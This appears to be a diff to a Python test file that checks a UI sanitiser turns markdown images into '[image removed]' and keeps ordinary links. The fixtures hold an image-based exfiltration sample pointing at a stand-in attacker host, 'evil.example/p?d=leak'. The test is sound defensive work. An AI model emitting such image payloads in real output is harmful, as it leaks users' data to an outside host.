@@ -229,7 +229,10 @@ def test_ui_import_writes_only_into_its_configured_dir(ui, tmp_path):
 def test_markdown_images_are_neutralized_but_links_survive(ui):
     text = "See ![pixel](https://evil.example/p?d=leak) and [the book](https://example.org/x)"
     out = ui.neutralize_markdown(text)
-    assert "evil.example" not in out and "[image removed]" in out and "example.org" in out
+    # The whole result, not a search for host names inside it: a substring test
+    # against a URL reads as an allow-list check and is not one here. The image
+    # construct leaves with its URL; the ordinary link is returned untouched.
+    assert out == "See [image removed] and [the book](https://example.org/x)"
     ref = "see ![pixel][x] here\n\n[x]: https://evil.example/p?d=leak"
     out = ui.neutralize_markdown(ref)
     assert "![" not in out and "[pixel][x]" in out          # demoted to a link, never an image
